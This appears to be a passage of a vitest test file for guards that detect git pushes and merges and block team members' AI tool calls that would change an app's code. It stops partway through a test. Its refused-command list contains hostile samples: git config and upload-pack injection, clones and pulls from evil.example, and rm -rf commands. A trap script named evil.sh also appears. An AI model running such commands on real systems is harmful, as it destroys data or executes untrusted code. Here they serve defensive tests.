import { execFileSync } from 'node:child_process';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import {
  APP_CODE_LINE,
  type AppCodeContext,
  CHANGE_CHECK_FAILED,
  detectPublish,
  guardToolCall,
  isAppCodePath,
  isBrainSync,
  isPublishTool,
  PUBLISH_LINE,
  publishFacts,
  quickPublishFacts,
  type Role,
  TEAM_APP_NOTICE,
  TEAM_APP_REFUSAL,
  teamAppRefusal,
  teamMayRun,
  touchesAppCode,
  UNKNOWN_ROLE_NOTICE,
} from './change-guards.ts';

const APP_URL = 'https://github.com/The-Digital-Stride/tds-brain-app.git';

let root: string;
let ctx: AppCodeContext;
/** A copy of the app's code elsewhere on the Mac (decision 2c). */
let appCopy: string;
/** An unrelated repo. */
let other: string;
let installed: string;

const GIT_ENV = {
  ...process.env,
  GIT_CONFIG_GLOBAL: '/dev/null',
  GIT_CONFIG_NOSYSTEM: '1',
  GIT_AUTHOR_NAME: 'T',
  GIT_AUTHOR_EMAIL: 't@example.com',
  GIT_COMMITTER_NAME: 'T',
  GIT_COMMITTER_EMAIL: 't@example.com',
};

function git(cwd: string, ...args: string[]): string {
  return execFileSync('git', args, { cwd, env: GIT_ENV, encoding: 'utf8' }).trim();
}

function makeRepo(dir: string, origin: string | null, branch = 'main'): string {
  mkdirSync(dir, { recursive: true });
  git(dir, 'init', '-q', '-b', branch);
  if (origin) git(dir, 'remote', 'add', 'origin', origin);
  return dir;
}

function commit(dir: string, message: string): string {
  writeFileSync(join(dir, 'file.txt'), `${message}\n`);
  git(dir, 'add', '.');
  git(dir, 'commit', '-q', '-m', message);
  return git(dir, 'rev-parse', 'HEAD');
}

/** Pretends `origin/<branch>` is at `sha`, with no network. */
function remoteRef(dir: string, branch: string, sha: string): void {
  git(dir, 'update-ref', `refs/remotes/origin/${branch}`, sha);
}

function track(dir: string, branch: string): void {
  git(dir, 'config', `branch.${branch}.remote`, 'origin');
  git(dir, 'config', `branch.${branch}.merge`, `refs/heads/${branch}`);
}

beforeAll(() => {
  root = realpathSync(mkdtempSync(join(tmpdir(), 'acg-')));
  const home = join(root, 'home');
  installed = join(home, 'Library', 'Application Support', 'TDS Brain', 'app');
  mkdirSync(home, { recursive: true });
  const appRoot = makeRepo(join(root, 'running-app'), APP_URL);
  const brainRoot = makeRepo(join(root, 'brain'), 'https://github.com/petetyler4/tds-agency-brain.git');
  mkdirSync(join(brainRoot, 'clients', 'the-digital-stride', 'projects', 'tds-brain-app'), {
    recursive: true,
  });
  appCopy = makeRepo(join(root, 'repos', 'app-copy'), 'git@github.com:the-digital-stride/TDS-Brain-App');
  other = makeRepo(join(root, 'repos', 'other'), 'https://github.com/someone/other.git');
  ctx = { appRoot, home, brainRoot };
});

afterAll(() => {
  rmSync(root, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// Literal blocks from the brain's update-cortex, install-cortex and doctor-cortex SKILL.md files.
// ---------------------------------------------------------------------------

const SKILL_VECTORS: string[] = [
  // update-cortex
  `APP="$HOME/Library/Application Support/TDS Brain/app"
test -d "$APP/.git" && echo installed`,
  `APP="$HOME/Library/Application Support/TDS Brain/app"
git -C "$APP" status --porcelain`,
  `APP="$HOME/Library/Application Support/TDS Brain/app"
git -C "$APP" fetch --quiet && git -C "$APP" log --oneline 'HEAD..@{upstream}'`,
  `APP="$HOME/Library/Application Support/TDS Brain/app"
git -C "$APP" show '@{upstream}:CHANGELOG.md'`,
  `APP="$HOME/Library/Application Support/TDS Brain/app"
built=$(stat -f %m "$APP/dist/client/index.html" 2>/dev/null || echo 0)
code=$(git -C "$APP" log -1 --format=%ct)
[ "$built" -ge "$code" ] && echo "up to date" || echo "needs finishing"`,
  `APP="$HOME/Library/Application Support/TDS Brain/app"
node -p 'require(process.argv[1]).version' "$APP/package.json"`,
  'printenv TDS_BRAIN_SERVICE',
  String.raw`APP="$HOME/Library/Application Support/TDS Brain/app"
cd "$APP" && git pull --ff-only && export PATH="$APP/bin:$PATH" \
  && npx --yes pnpm@10 install --frozen-lockfile && npx --yes pnpm@10 build`,
  String.raw`APP="$HOME/Library/Application Support/TDS Brain/app"
cd "$APP" && export PATH="$APP/bin:$PATH" \
  && npx --yes pnpm@10 install --frozen-lockfile && npx --yes pnpm@10 build`,
  `APP="$HOME/Library/Application Support/TDS Brain/app"
"$APP/bin/tds-brain" restart`,
  `APP="$HOME/Library/Application Support/TDS Brain/app"
"$APP/bin/tds-brain" doctor`,
  // install-cortex
  'pwd -P',
  `test -d "$HOME/Library/Application Support/TDS Brain/app/.git" && echo code
test -f "$HOME/Library/LaunchAgents/uk.co.thedigitalstride.tds-brain.plist" && echo service`,
  'uname -s',
  'git --version',
  `for n in /usr/local/bin/node /opt/homebrew/bin/node /usr/bin/node "$HOME"/.nvm/versions/node/*/bin/node; do
  [ -x "$n" ] && echo "$n $("$n" --version)"
done`,
  String.raw`cd "$TMPDIR" && curl -fsSLO https://nodejs.org/dist/latest-v24.x/SHASUMS256.txt \
  && PKG=$(awk '/node-v24\.[0-9.]*\.pkg$/ {print $2}' SHASUMS256.txt) \
  && curl -fsSLO "https://nodejs.org/dist/latest-v24.x/$PKG" \
  && grep " $PKG\$" SHASUMS256.txt | shasum -a 256 -c - && echo "READY $PKG"`,
  'test -d "/Applications/Google Chrome.app"',
  'command -v claude',
  'test -x ~/.local/bin/claude',
  `GIT_TERMINAL_PROMPT=0 git ls-remote https://github.com/The-Digital-Stride/tds-brain-app.git HEAD`,
  String.raw`APP="$HOME/Library/Application Support/TDS Brain/app"
mkdir -p "$HOME/Library/Application Support/TDS Brain" \
  && git clone https://github.com/The-Digital-Stride/tds-brain-app.git "$APP" \
  && cd "$APP" && export PATH="$APP/bin:$PATH" \
  && npx --yes pnpm@10 install --frozen-lockfile && npx --yes pnpm@10 build`,
  `APP="$HOME/Library/Application Support/TDS Brain/app"
"$APP/bin/tds-brain" install --brain "/Users/someone/agencybrain"`,
  // doctor-cortex
  `test -x "$HOME/Library/Application Support/TDS Brain/app/bin/tds-brain"`,
  `tail -n 40 "$HOME/Library/Logs/TDS Brain/server.log"`,
];

// ---------------------------------------------------------------------------

describe('detectPublish (decision 6)', () => {
  const pushes = [
    'git push',
    'git push origin main',
    'git -C /tmp/x push',
    'git -c user.name=x push',
    'env FOO=1 git push',
    'FOO=1 git push',
    '/usr/bin/git push',
    'command git push',
    'if true; then git push; fi',
    'for b in a; do git push origin "$b"; done',
    '(cd /tmp && git push)',
    'git add . && git commit -m x && git push',
    'git status; git push &',
    'bash -c "git push"',
    "sh -c 'git push origin main'",
    'zsh -lc "git push"',
    'eval git push',
    'echo $(git push)',
    'git --no-pager push',
    'git push --force-with-lease',
  ];
  for (const cmd of pushes) {
    it(`${cmd} is a push`, () => {
      expect(detectPublish(cmd)?.kind).toBe('push');
    });
  }

  const merges = [
    'git merge feature',
    'git merge --no-ff feature',
    'git -C /repo merge -m "Merge it" feature',
    'gh pr merge 12 --squash',
    'gh api repos/o/r/merges -f base=main -f head=x',
    'gh api -X PUT repos/o/r/pulls/3/merge',
    'wt-finish --merge',
    '~/.claude/skills/worktree-flow/scripts/wt-finish --merge',
  ];
  for (const cmd of merges) {
    it(`${cmd} is a merge`, () => {
      expect(detectPublish(cmd)?.kind).toBe('merge');
    });
  }

  it('wt-finish --merge --push and a merge chained with a push are both', () => {
    expect(detectPublish('wt-finish --merge --push')?.kind).toBe('merge-and-push');
    expect(detectPublish('git merge x && git push')?.kind).toBe('merge-and-push');
    expect(detectPublish('wt-finish --push')?.kind).toBe('push');
  });

  const notPublish = [
    'git pull',
    'git pull --ff-only',
    'git merge-base HEAD main',
    'git merge-file a b c',
    'git merge-tree a b',
    'git merge --abort',
    'git merge --quit',
    'git push --dry-run',
    'git push -n origin main',
    'wt-finish',
    'wt-finish --check',
    'echo "git push"',
    'git log --grep=push',
    'gh pr view 12',
    'gh api repos/o/r/pulls',
    'ls',
    '',
  ];
  for (const cmd of notPublish) {
    it(`${JSON.stringify(cmd)} is not a publish`, () => {
      expect(detectPublish(cmd)).toBeNull();
    });
  }

  it('a heredoc commit message that mentions git push is not a publish', () => {
    const cmd = "git commit -F - <<'EOF'\nfix: stop the git push loop\n\ngit push --force everywhere\nEOF";
    expect(detectPublish(cmd)).toBeNull();
    expect(detectPublish(`${cmd}\ngit push`)?.kind).toBe('push');
  });

  it('skips a heredoc body inside $(…), so an apostrophe in a commit message is not a push', () => {
    const cmd = "git commit -m \"$(cat <<'EOF'\nfix: the push notice doesn't wrap\nEOF\n)\"";
    expect(detectPublish(cmd)).toBeNull();
    expect(detectPublish(cmd.replace("<<'EOF'", '<<"EOF"'))).toBeNull();
    expect(detectPublish(cmd.replace("<<'EOF'", '<<EOF'))).toBeNull();
    expect(detectPublish(cmd.replace("<<'EOF'\n", '<<-EOF\n').replace('\nEOF\n', '\n\tEOF\n'))).toBeNull();
    expect(detectPublish(`${cmd} && git push`)).toMatchObject({ kind: 'push', plain: true });
    // Arithmetic shifts are not heredocs.
    expect(detectPublish('echo $((1<<2)) && git push')?.kind).toBe('push');
  });

  it('counts gh api writes to contents, refs and merges', () => {
    expect(
      detectPublish('gh api -X PUT repos/o/r/contents/README.md -f message=x -f content=eA==')?.kind,
    ).toBe('push');
    expect(detectPublish('gh api repos/o/r/contents/a.txt -f message=x')?.kind).toBe('push');
    expect(detectPublish('gh api --method=PATCH repos/o/r/git/refs/heads/main -f sha=abc')?.kind).toBe(
      'push',
    );
    expect(detectPublish('gh api --method DELETE repos/o/r/git/refs/heads/x')?.kind).toBe('push');
    expect(detectPublish('gh api -XPOST repos/o/r/git/refs -F ref=refs/heads/x -F sha=abc')?.kind).toBe(
      'push',
    );
    expect(detectPublish('gh api -X POST repos/o/r/merges -f base=main -f head=x')?.kind).toBe('merge');
    // Reads are not.
    expect(detectPublish('gh api repos/o/r/git/refs/heads/main')).toBeNull();
    expect(detectPublish('gh api repos/o/r/contents/README.md')).toBeNull();
    expect(detectPublish('gh api -X GET repos/o/r/contents/x -f ref=main')).toBeNull();
  });

  it('counts a git alias defined with -c that pushes or merges', () => {
    expect(detectPublish('git -c alias.p=push p')?.kind).toBe('push');
    expect(detectPublish('git -c alias.m=merge m feature')).toMatchObject({ kind: 'merge', ref: 'feature' });
    expect(detectPublish("git -c 'alias.sync=push --force' sync")).toMatchObject({
      kind: 'push',
      danger: 'force',
      plain: false,
    });
    expect(detectPublish("git -c 'alias.x=!git push origin main' x")?.kind).toBe('push');
    expect(detectPublish('git -c alias.P=push p')?.kind).toBe('push');
    expect(detectPublish('git -c alias.p=push p --dry-run')).toBeNull();
    expect(detectPublish('git -c alias.l=log l')).toBeNull();
    expect(detectPublish('git -c alias.p=push status')).toBeNull();
  });

  it('counts git subtree push', () => {
    expect(detectPublish('git subtree push -P lib origin main')).toMatchObject({
      kind: 'push',
      plain: false,
    });
    expect(detectPublish('git subtree split -P lib')).toBeNull();
  });

  it('only a bare git push with no options or environment is plain', () => {
    expect(detectPublish('git push')?.plain).toBe(true);
    expect(detectPublish('git push origin main')?.plain).toBe(true);
    for (const cmd of [
      'GIT_DIR=/other/.git git push',
      'env GIT_DIR=/other/.git git push',
      'GIT_DIR=x GIT_WORK_TREE=y git push',
      'export GIT_DIR=/other/.git; git push',
      'pushd /other && git push',
      'git -C /x push',
      'git --no-pager push',
      '/usr/bin/git push',
      'command git push',
      'FOO=1 git push',
    ]) {
      expect(detectPublish(cmd)?.plain, cmd).toBe(false);
    }
  });

  it('marks force pushes, deletes and mirrors as dangerous', () => {
    expect(detectPublish('git push -f')?.danger).toBe('force');
    expect(detectPublish('git push --force origin main')?.danger).toBe('force');
    expect(detectPublish('git push --force-with-lease')?.dangerous).toBe(true);
    expect(detectPublish('git push origin +main')?.danger).toBe('force');
    expect(detectPublish('git push origin --delete old')?.danger).toBe('delete');
    expect(detectPublish('git push origin :old')?.danger).toBe('delete');
    expect(detectPublish('git push --mirror')?.danger).toBe('mirror');
    expect(detectPublish('git push')?.dangerous).toBe(false);
  });

  it('finds the repo folder: -C first, else the last cd before it', () => {
    expect(detectPublish('git -C /a push')?.repoDir).toBe('/a');
    expect(detectPublish('cd /a && cd /b && git push')?.repoDir).toBe('/b');
    expect(detectPublish('cd /a && git -C /c push')?.repoDir).toBe('/c');
    expect(detectPublish('git push')?.repoDir).toBeNull();
    expect(detectPublish('R=/r; git -C "$R" push')?.repoDir).toBe('/r');
  });

  it('follows pushd, popd, cd - and a bare cd for the repo folder', () => {
    expect(detectPublish('pushd /a && git push')?.repoDir).toBe('/a');
    expect(detectPublish('cd /a && pushd /b && popd && git push')?.repoDir).toBe('/a');
    expect(detectPublish('cd /a && cd /b && cd - && git push')?.repoDir).toBe('/a');
    expect(detectPublish('cd && git push')?.repoDir).toBe('~');
  });

  it('reads the ref for a push and a merge', () => {
    expect(detectPublish('git push origin feature')?.ref).toBe('feature');
    expect(detectPublish('git push origin feature')?.remote).toBe('origin');
    expect(detectPublish('git push')?.ref).toBeNull();
    expect(detectPublish('git merge --no-ff -m "x y" feature')?.ref).toBe('feature');
  });
});

describe('isPublishTool', () => {
  it('names GitHub merge and push tools', () => {
    expect(isPublishTool('mcp__github__merge_pull_request')).toBe('merge');
    expect(isPublishTool('mcp__github__push_files')).toBe('push');
    expect(isPublishTool('mcp__plugin_github_github__create_or_update_file')).toBe('push');
    expect(isPublishTool('mcp__github__delete_file')).toBe('push');
    expect(isPublishTool('mcp__github__get_pull_request')).toBeNull();
    expect(isPublishTool('mcp__slack__merge')).toBeNull();
    expect(isPublishTool('Bash')).toBeNull();
  });
});

describe('isAppCodePath (decision 2)', () => {
  it('counts the running copy, the installed copy and any repo whose origin is the app', async () => {
    expect(await isAppCodePath(join(ctx.appRoot, 'server', 'index.ts'), ctx)).toBe(true);
    expect(await isAppCodePath(ctx.appRoot, ctx)).toBe(true);
    expect(await isAppCodePath(join(installed, 'server', 'x.ts'), ctx)).toBe(true);
    expect(await isAppCodePath(join(appCopy, 'new', 'file.ts'), ctx)).toBe(true);
  });

  it('counts a worktree of an app repo', async () => {
    commit(appCopy, 'first');
    const wt = join(root, 'repos', 'app-copy-wt');
    git(appCopy, 'worktree', 'add', '-q', '-b', 'wt-branch', wt);
    expect(await isAppCodePath(join(wt, 'server', 'x.ts'), ctx)).toBe(true);
  });

  it('follows symbolic links', async () => {
    const link = join(root, 'link-to-app');
    symlinkSync(ctx.appRoot, link);
    expect(await isAppCodePath(join(link, 'x.ts'), ctx)).toBe(true);
  });

  it("doesn't count the brain, its tds-brain-app project folder or other repos", async () => {
    expect(
      await isAppCodePath(join(ctx.brainRoot, 'clients/the-digital-stride/projects/tds-brain-app/x.md'), ctx),
    ).toBe(false);
    expect(await isAppCodePath(join(other, 'x.ts'), ctx)).toBe(false);
    expect(await isAppCodePath(join(root, 'nowhere', 'x'), ctx)).toBe(false);
    // A sibling whose name starts the same is not inside.
    expect(await isAppCodePath(`${ctx.appRoot}-other/x`, ctx)).toBe(false);
  });
});

describe('touchesAppCode (decision 4)', () => {
  it('sees the app through variables, markers, paths and the working folder', async () => {
    const cwd = ctx.brainRoot;
    expect(await touchesAppCode('cd "$APP" && ls', cwd, ctx)).toBe(true);
    expect(await touchesAppCode(['ls $', '{APP}/x'].join(''), cwd, ctx)).toBe(true);
    expect(await touchesAppCode(String.raw`ls ~/Library/Application\ Support/TDS\ Brain/app`, cwd, ctx)).toBe(
      true,
    );
    expect(await touchesAppCode(String.raw`cat /x/TDS\ Brain/app/y`, cwd, ctx)).toBe(true);
    expect(await touchesAppCode('cat "$HOME/Library/Application Support/TDS Brain/app/x"', cwd, ctx)).toBe(
      true,
    );
    expect(
      await touchesAppCode('git clone https://github.com/the-digital-stride/TDS-brain-app x', cwd, ctx),
    ).toBe(true);
    expect(await touchesAppCode(`sed -i '' s/a/b/ ${ctx.appRoot}/server/x.ts`, cwd, ctx)).toBe(true);
    expect(await touchesAppCode('sed -i s/a/b/ server/x.ts', ctx.appRoot, ctx)).toBe(true);
    expect(await touchesAppCode('ls', join(ctx.appRoot, 'server'), ctx)).toBe(true);
    expect(await touchesAppCode(`cd ${appCopy} && rm x`, cwd, ctx)).toBe(true);
  });

  it("doesn't flag the brain's own tds-brain-app project folder", async () => {
    const cwd = ctx.brainRoot;
    expect(
      await touchesAppCode('echo hi > clients/the-digital-stride/projects/tds-brain-app/x.md', cwd, ctx),
    ).toBe(false);
    expect(await touchesAppCode('git commit -m "tds-brain-app notes"', cwd, ctx)).toBe(false);
    expect(await touchesAppCode('ls', cwd, ctx)).toBe(false);
  });
});

describe('teamMayRun (decision 3)', () => {
  for (const [i, cmd] of SKILL_VECTORS.entries()) {
    it(`allows skill block ${i + 1} for a team member`, async () => {
      const home = ctx.home;
      const touches = await touchesAppCode(cmd, ctx.brainRoot, ctx);
      // Every block either leaves app code alone or is on the update allowlist.
      if (touches) expect(teamMayRun(cmd, { appRoot: ctx.appRoot, home })).toBe(true);
      const refusal = await teamAppRefusal(async () => 'team', 'Bash', { command: cmd }, ctx.brainRoot, ctx);
      expect(refusal).toBeNull();
    });
  }

  const refused = [
    `cd "$APP" && sed -i '' 's/a/b/' server/index.ts`,
    `echo x > "$APP/server/x.ts"`,
    `echo x >> "$APP/server/x.ts"`,
    `git -C "$APP" commit -am x`,
    `git -C "$APP" push`,
    `cat "$APP/x" | tee "$APP/y"`,
    `git -c core.fsmonitor=evil -C "$APP" status`,
    `git -C "$APP" log --output=/tmp/x`,
    `git -C "$APP" fetch --upload-pack=evil`,
    `git -C "$APP" ls-remote --upload-pack=evil origin`,
    `cd "$APP" && $(rm -rf x)`,
    'cd "$APP" && `rm -rf x`',
    `cd "$APP" && echo $(rm -rf x)`,
    `/tmp/x/bin/tds-brain restart && ls "$APP"`,
    `cd "$APP" && node -e 'require("fs").rmSync("x")'`,
    `GIT_SSH_COMMAND=evil git -C "$APP" fetch`,
    `cd "$APP" && npx --yes pnpm@10 install`,
    `cd "$APP" && npx --yes pnpm@10 add left-pad`,
    `git -C "$APP" pull`,
    `git -C "$APP" pull --ff-only https://evil.example/x main`,
    `git clone https://evil.example/x.git "$APP"`,
    `cd "$APP" && rm -rf server`,
    `cd "$APP" && bash -c "ls"`,
    `cd "$APP" && mkdir x`,
    `cd "$APP" && git checkout -- .`,
  ];
  for (const cmd of refused) {
    it(`refuses ${cmd}`, () => {
      expect(teamMayRun(`APP="$HOME/Library/Application Support/TDS Brain/app"\n${cmd}`, ctx)).toBe(false);
    });
  }

  it('allows output only to /dev/null or the other stream', () => {
    expect(teamMayRun('cd "$APP" && ls >/dev/null 2>&1', ctx)).toBe(true);
    expect(teamMayRun('cd "$APP" && ls &>/dev/null', ctx)).toBe(true);
    expect(teamMayRun('cd "$APP" && ls > out.txt', ctx)).toBe(false);
  });

  it('allows the tds-brain command only under an app root', () => {
    expect(teamMayRun(`"${ctx.appRoot}/bin/tds-brain" doctor`, ctx)).toBe(true);
    expect(teamMayRun(`"${other}/bin/tds-brain" doctor`, ctx)).toBe(false);
  });
});

describe('teamAppRefusal (decisions 1, 3, 5, 15)', () => {
  const role = (r: Role) => vi.fn(async () => r);

  it('never refuses reads', async () => {
    const getRole = role('team');
    for (const tool of ['Read', 'Grep', 'Glob']) {
      expect(
        await teamAppRefusal(
          getRole,
          tool,
          { file_path: join(ctx.appRoot, 'x'), path: ctx.appRoot },
          ctx.brainRoot,
          ctx,
        ),
      ).toBeNull();
    }
    expect(getRole).not.toHaveBeenCalled();
  });

  it("refuses a team member's edit to app code, with the feature-request offer", async () => {
    const calls: [string, Record<string, unknown>, string][] = [
      ['Write', { file_path: join(ctx.appRoot, 'server', 'x.ts'), content: 'x' }, ctx.brainRoot],
      [
        'Edit',
        { file_path: join(installed, 'server', 'x.ts'), old_string: 'a', new_string: 'b' },
        ctx.brainRoot,
      ],
      ['MultiEdit', { file_path: join(appCopy, 'x.ts'), edits: [] }, ctx.brainRoot],
      ['NotebookEdit', { notebook_path: join(ctx.appRoot, 'n.ipynb'), new_source: 'x' }, ctx.brainRoot],
      ['Edit', { file_path: 'server/x.ts', old_string: 'a', new_string: 'b' }, ctx.appRoot],
    ];
    for (const [tool, input, cwd] of calls) {
      expect(await teamAppRefusal(role('team'), tool, input, cwd, ctx)).toEqual({
        reason: TEAM_APP_REFUSAL,
        notice: TEAM_APP_NOTICE,
      });
    }
  });

  it('lets owners and scouts change app code', async () => {
    const input = { file_path: join(ctx.appRoot, 'server', 'x.ts'), content: 'x' };
    expect(await teamAppRefusal(role('owner'), 'Write', input, ctx.brainRoot, ctx)).toBeNull();
    expect(await teamAppRefusal(role('scout'), 'Write', input, ctx.brainRoot, ctx)).toBeNull();
    expect(
      await teamAppRefusal(
        role('scout'),
        'Bash',
        { command: `cd ${ctx.appRoot} && sed -i '' s/a/b/ x` },
        ctx.brainRoot,
        ctx,
      ),
    ).toBeNull();
  });

  it('fails closed on an unknown role', async () => {
    const input = { file_path: join(ctx.appRoot, 'server', 'x.ts'), content: 'x' };
    expect(await teamAppRefusal(role('unknown'), 'Write', input, ctx.brainRoot, ctx)).toEqual({
      reason: UNKNOWN_ROLE_NOTICE,
      notice: UNKNOWN_ROLE_NOTICE,
    });
  });

  it('fails closed when the role read throws', async () => {
    const input = { file_path: join(ctx.appRoot, 'server', 'x.ts'), content: 'x' };
    const getRole = vi.fn(async (): Promise<Role> => {
      throw new Error('boom');
    });
    expect(await teamAppRefusal(getRole, 'Write', input, ctx.brainRoot, ctx)).toEqual({
      reason: CHANGE_CHECK_FAILED,
      notice: CHANGE_CHECK_FAILED,
    });
  });

  it('reads the role only once a call touches app code, and not for the update allowlist', async () => {
    const getRole = role('team');
    expect(
      await teamAppRefusal(
        getRole,
        'Edit',
        { file_path: join(ctx.brainRoot, 'clients/the-digital-stride/projects/tds-brain-app/x.md') },
        ctx.brainRoot,
        ctx,
      ),
    ).toBeNull();
    expect(await teamAppRefusal(getRole, 'Bash', { command: 'git push' }, ctx.brainRoot, ctx)).toBeNull();
    expect(
      await teamAppRefusal(getRole, 'Bash', { command: SKILL_VECTORS[1] as string }, ctx.brainRoot, ctx),
    ).toBeNull();
    expect(getRole).not.toHaveBeenCalled();
  });

  it("refuses a team member's command on a folder holding the app, after a bare cd, or through a glob", async () => {
    const cmds = [
      `rm -rf "$HOME/Library/Application Support/TDS Brain"`,
      `cp -R /tmp/p/app "$HOME/Library/Application Support/TDS Brain/"`,
      `rsync -a /tmp/p/ "$HOME/Library/Application Support/TDS Brain/app/"`,
      `find "$HOME/Library/Application Support/TDS Brain" -name '*.ts' -exec sed -i '' 's,a,b,' {} +`,
      `cd "$HOME/Library/Application Support/TDS Brain" && cd app && sed -i '' -e 's,a,b,' package.json`,
      String.raw`sed -i '' 's,a,b,' ~/Library/Application\ Support/TDS\ Brain/ap*/package.json`,
      `rm -rf ~/Library`,
      `cd "$HOME/Library/Application Support" && cd "TDS Brain" && rm -rf app`,
    ];
    for (const command of cmds) {
      expect(await teamAppRefusal(role('team'), 'Bash', { command }, ctx.brainRoot, ctx), command).toEqual({
        reason: TEAM_APP_REFUSAL,
        notice: TEAM_APP_NOTICE,
      });
    }
    // A working folder that holds the app counts too.
    const support = join(ctx.home, 'Library', 'Application Support');
    expect(
      await teamAppRefusal(role('team'), 'Bash', { command: 'rm -rf "TDS Brain"' }, support, ctx),
    ).toEqual({ reason: TEAM_APP_REFUSAL, notice: TEAM_APP_NOTICE });
  });

  it("doesn't count home itself, the root or folders above home as holding the app", async () => {
    const getRole = role('team');
    for (const command of [
      'cp x ~/',
      'cp x "$HOME"',
      'ls /',
      `ls ${join(ctx.home, '..')}`,
      'cd && touch x',
    ]) {
      expect(await teamAppRefusal(getRole, 'Bash', { command }, ctx.brainRoot, ctx), command).toBeNull();
    }
    expect(getRole).not.toHaveBeenCalled();
  });

  it('expands ~/ in an edit tool path', async () => {
    const input = { file_path: '~/Library/Application Support/TDS Brain/app/server/x.ts', content: 'x' };
    expect(await teamAppRefusal(role('team'), 'Write', input, ctx.brainRoot, ctx)).toEqual({
      reason: TEAM_APP_REFUSAL,
      notice: TEAM_APP_NOTICE,
    });
  });

  it('refuses a team member sed in the installed app', async () => {
    const cmd = `APP="$HOME/Library/Application Support/TDS Brain/app"
cd "$APP" && sed -i '' 's/a/b/' server/index.ts`;
    expect(await teamAppRefusal(role('team'), 'Bash', { command: cmd }, ctx.brainRoot, ctx)).toEqual({
      reason: TEAM_APP_REFUSAL,
      notice: TEAM_APP_NOTICE,
    });
  });
});

describe('publishFacts (decision 8)', () => {
  let repo: string;
  let base: string;

  beforeAll(() => {
    repo = makeRepo(join(root, 'facts', 'app'), APP_URL);
    writeFileSync(join(repo, 'package.json'), JSON.stringify({ version: '9.8.7' }));
    base = commit(repo, 'base');
    remoteRef(repo, 'main', base);
    git(repo, 'symbolic-ref', 'refs/remotes/origin/HEAD', 'refs/remotes/origin/main');
    track(repo, 'main');
    commit(repo, 'fix: one');
    commit(repo, 'feat: two');
  });

  it('shows the commits a push sends, newest first, with the version', async () => {
    const d = detectPublish('git push');
    if (!d) throw new Error('no publish');
    const f = await publishFacts(d, 'git push', repo, ctx);
    expect(f).toMatchObject({
      kind: 'push',
      repo: 'The-Digital-Stride/tds-brain-app',
      isApp: true,
      branch: 'main',
      target: 'main',
      version: '9.8.7',
      commitCount: 2,
      command: 'git push',
      warning: null,
    });
    expect(f.commits?.map((c) => c.replace(/^\w+ /, ''))).toEqual(['feat: two', 'fix: one']);
  });

  it('uses the repo named by -C or cd, not the working folder', async () => {
    const cmd = `git -C "${repo}" push`;
    const d = detectPublish(cmd);
    if (!d) throw new Error('no publish');
    expect((await publishFacts(d, cmd, other, ctx)).commitCount).toBe(2);
    const cmd2 = `cd "${repo}" && git push`;
    const d2 = detectPublish(cmd2);
    if (!d2) throw new Error('no publish');
    expect((await publishFacts(d2, cmd2, other, ctx)).isApp).toBe(true);
  });

  it('shows a merge of a branch into the current one', async () => {
    git(repo, 'branch', 'feature');
    git(repo, 'checkout', '-q', 'feature');
    commit(repo, 'feat: three');
    git(repo, 'checkout', '-q', 'main');
    const d = detectPublish('git merge --no-ff feature');
    if (!d) throw new Error('no publish');
    const f = await publishFacts(d, 'git merge --no-ff feature', repo, ctx);
    expect(f).toMatchObject({ kind: 'merge', branch: 'feature', target: 'main', commitCount: 1 });
  });

  it('shows what wt-finish lands against the default branch', async () => {
    git(repo, 'checkout', '-q', 'feature');
    const d = detectPublish('wt-finish --merge --push');
    if (!d) throw new Error('no publish');
    const f = await publishFacts(d, 'wt-finish --merge --push', repo, ctx);
    git(repo, 'checkout', '-q', 'main');
    expect(f).toMatchObject({ kind: 'merge-and-push', branch: 'feature', target: 'main', commitCount: 3 });
  });

  it("shows a named branch's own commits when it isn't the current one", async () => {
    remoteRef(repo, 'feature', base);
    const cmd = 'git push origin feature';
    const d = detectPublish(cmd);
    if (!d) throw new Error('no publish');
    // From main: feature carries fix: one, feat: two and feat: three; main itself only two.
    const f = await publishFacts(d, cmd, repo, ctx);
    expect(f).toMatchObject({ kind: 'push', branch: 'feature', target: 'feature', commitCount: 3 });
    expect(f.commits?.[0]?.replace(/^\w+ /, '')).toBe('feat: three');
  });

  it('names the other remote and its branch when the push goes somewhere other than origin', async () => {
    git(repo, 'remote', 'add', 'fork', 'https://github.com/me/fork.git');
    git(repo, 'update-ref', 'refs/remotes/fork/main', git(repo, 'rev-parse', 'main~1'));
    for (const cmd of ['git push fork', 'git push fork main', 'git push fork HEAD']) {
      const d = detectPublish(cmd);
      if (!d) throw new Error('no publish');
      expect(await publishFacts(d, cmd, repo, ctx), cmd).toMatchObject({
        repo: 'me/fork',
        branch: 'main',
        target: 'main',
        commitCount: 1,
      });
    }
    const url = 'git push https://github.com/x/y.git main';
    const d = detectPublish(url);
    if (!d) throw new Error('no publish');
    expect(await publishFacts(d, url, repo, ctx)).toMatchObject({ repo: 'x/y', commits: null });
  });

  it('caps the list at 20 but counts them all', async () => {
    const big = makeRepo(join(root, 'facts', 'big'), 'https://github.com/o/big.git');
    const first = commit(big, 'c0');
    remoteRef(big, 'main', first);
    track(big, 'main');
    for (let i = 1; i <= 23; i++) commit(big, `c${i}`);
    const d = detectPublish('git push');
    if (!d) throw new Error('no publish');
    const f = await publishFacts(d, 'git push', big, ctx);
    expect(f.commits).toHaveLength(20);
    expect(f.commitCount).toBe(23);
    expect(f.repo).toBe('o/big');
    expect(f.isApp).toBe(false);
    expect(f.version).toBeNull();
  });

  it('warns about a force push and a delete', async () => {
    const force = detectPublish('git push --force');
    const del = detectPublish('git push origin --delete old');
    if (!force || !del) throw new Error('no publish');
    expect((await publishFacts(force, 'git push --force', repo, ctx)).warning).toMatch(/force push/);
    expect((await publishFacts(del, 'git push origin --delete old', repo, ctx)).warning).toMatch(
      /deletes a branch/,
    );
  });

  it('leaves what it cannot read as null and never throws', async () => {
    const d = detectPublish('git push');
    if (!d) throw new Error('no publish');
    const f = await publishFacts(d, 'git push', join(root, 'not-a-folder'), ctx);
    expect(f).toMatchObject({ kind: 'push', repo: null, branch: null, commits: null, commitCount: null });
    const weird = detectPublish('git push origin --upload-pack=x');
    if (!weird) throw new Error('no publish');
    await expect(publishFacts(weird, 'x', repo, ctx)).resolves.toBeTruthy();
  });

  it("doesn't run code the repo controls", async () => {
    const trap = makeRepo(join(root, 'facts', 'trap'), 'https://github.com/o/trap.git');
    const marker = join(root, 'facts', 'ran');
    const script = join(root, 'facts', 'evil.sh');
    writeFileSync(script, `#!/bin/sh\ntouch "${marker}"\n`, { mode: 0o755 });
    const c = commit(trap, 'x');
